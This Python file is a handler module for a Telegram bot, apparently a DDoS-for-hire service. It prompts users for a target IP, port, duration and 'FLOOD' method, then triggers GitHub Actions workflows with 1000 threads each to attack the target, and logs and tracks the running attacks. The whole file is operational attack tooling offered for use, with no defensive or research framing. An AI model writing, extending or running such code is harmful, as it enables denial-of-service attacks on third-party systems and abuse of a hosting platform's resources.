# handlers/launch.py
from pyrogram import filters
from pyrogram.types import Message, CallbackQuery
from config import OWNER_ID, WORKFLOW_COUNT
from database import is_active, is_admin, add_attack, add_log
from keyboards import attack_confirm, method_select, stop_confirm, main_menu
from services.github import launch_all, get_all_runs, test_connection
from utils.validators import valid_ip, valid_port, valid_duration
import state
import time
import asyncio
from datetime import datetime

def register(app):

    @app.on_callback_query(filters.regex("^launch$"))
    async def launch_start(client, cb: CallbackQuery):
        user_id = cb.from_user.id
        if not (user_id == OWNER_ID or is_admin(user_id) or is_active(user_id)):
            return await cb.answer("❌ No access", show_alert=True)

        state.attack_state[user_id] = {"step": "ip"}
        await cb.message.edit_text(
            "**📝 Send target IP address:**\n\n"
            "**Example:** `1.1.1.1`\n\n"
            "**Send /cancel to cancel**"
        )

    @app.on_message(filters.private & filters.text &
                    ~filters.command(["start", "cancel"]))
    async def attack_input(client, message: Message):
        user_id = message.from_user.id
        if user_id not in state.attack_state:
            return

        s = state.attack_state[user_id]
        if s.get("step") not in ["ip", "port", "duration"]:
            return

        text = message.text.strip()
        step = s["step"]

        if step == "ip":
            if not valid_ip(text):
                return await message.reply("❌ **Invalid IP address**, try again:")
            s["ip"] = text
            s["step"] = "port"
            return await message.reply(
                f"**✅ IP:** `{text}`\n\n"
                f"**📝 Send target PORT:**\n"
                f"**Example:** `80` or `443`"
            )

        if step == "port":
            if not valid_port(text):
                return await message.reply("❌ **Invalid port** (1-65535), try again:")
            s["port"] = int(text)
            s["step"] = "duration"
            return await message.reply(
                f"**✅ Port:** `{text}`\n\n"
                f"**⏰ Send duration (seconds):**\n"
                f"**Example:** `300`\n"
                f"**Max:** `21000`"
            )

        if step == "duration":
            if not valid_duration(text):
                return await message.reply("❌ **Invalid duration** (1-21000), try again:")
            s["duration"] = int(text)
            s["step"] = "method"
            return await message.reply(
                f"**✅ Duration:** `{text}s`\n\n"
                f"**⚡ Select attack method:**",
                reply_markup=method_select()
            )

    @app.on_callback_query(filters.regex("^method_"))
    async def method_selected(client, cb: CallbackQuery):
        user_id = cb.from_user.id
        if user_id not in state.attack_state:
            return await cb.answer("❌ No attack pending", show_alert=True)

        s = state.attack_state[user_id]
        if s.get("step") != "method":
            return await cb.answer("❌ Invalid step", show_alert=True)

        method = cb.data.replace("method_", "").upper()
        s["method"] = f"{method} FLOOD"

        await cb.message.edit_text(
            f"**🎯 CONFIRM ATTACK**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"**🌐 Target:** `{s['ip']}:{s['port']}`\n"
            f"**⏰ Duration:** `{s['duration']}s`\n"
            f"**⚡ Method:** `{s['method']}`\n"
            f"**🖥️ Servers:** `{WORKFLOW_COUNT}`\n\n"
            f"**⚠️ Ready to launch?**",
            reply_markup=attack_confirm()
        )

    @app.on_callback_query(filters.regex("^confirm_attack$"))
    async def confirm_attack(client, cb: CallbackQuery):
        user_id = cb.from_user.id
        if user_id not in state.attack_state:
            return await cb.answer("❌ No attack pending", show_alert=True)

        s = state.attack_state.pop(user_id)
        await cb.message.edit_text("**⏳ Connecting to GitHub...**")

        connection_ok = test_connection()
        if not connection_ok:
            add_log("attack_failed", user_id, "GitHub connection failed")
            return await cb.message.edit_text(
                "**❌ FAILED**\n\nGitHub connection error.\nCheck token in Token Management.",
                reply_markup=main_menu(is_admin=is_admin(user_id), is_owner=user_id == OWNER_ID)
            )

        await cb.message.edit_text("**⏳ Launching workflows...**")
        threads = 1000
        count = launch_all(s["ip"], s["port"], threads, s["duration"])

        if count == 0:
            add_log("attack_failed", user_id, "No workflows triggered")
            return await cb.message.edit_text(
                "**❌ FAILED**\n\nNo workflows started. Check GitHub repo/token.",
                reply_markup=main_menu(is_admin=is_admin(user_id), is_owner=user_id == OWNER_ID)
            )

        # 5 second wait তারপর actual running count check
        await asyncio.sleep(5)
        runs = get_all_runs()
        running = sum(
            1 for wf, st in runs.items()
            if wf.startswith("bot") and st in ["in_progress", "queued"]
        )

        # Global state update
        state.current_target = {
            "ip": s["ip"],
            "port": s["port"],
            "threads": threads,
            "duration": s["duration"]
        }
        state.watchdog_enabled = True

        attack_id = f"atk_{user_id}_{int(time.time())}"
        add_attack(attack_id, {
            "user_id": user_id,
            "ip": s["ip"],
            "port": s["port"],
            "duration": s["duration"],
            "method": s["method"],
            "servers": count,
            "started_at": datetime.now().isoformat(),
            "status": "running"
        })
        add_log("attack_started", user_id, f"{s['ip']}:{s['port']}")

        await cb.message.edit_text(
            f"**🎯 ATTACK LAUNCHED!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"**🆔 ID:** `{attack_id}`\n"
            f"**🌐 Target:** `{s['ip']}:{s['port']}`\n"
            f"**⏰ Duration:** `{s['duration']}s`\n"
            f"**⚡ Method:** `{s['method']}`\n"
            f"**🖥️ Triggered:** `{count}` workflows\n"
            f"**✅ Running:** `{running}`",
            reply_markup=stop_confirm()
        )

    @app.on_callback_query(filters.regex("^cancel_attack$"))
    async def cancel_attack(client, cb: CallbackQuery):
        state.attack_state.pop(cb.from_user.id, None)
        await cb.message.edit_text(
            "❌ **Attack cancelled.**",
            reply_markup=main_menu(
                is_admin=is_admin(cb.from_user.id),
                is_owner=cb.from_user.id == OWNER_ID
            )
        )
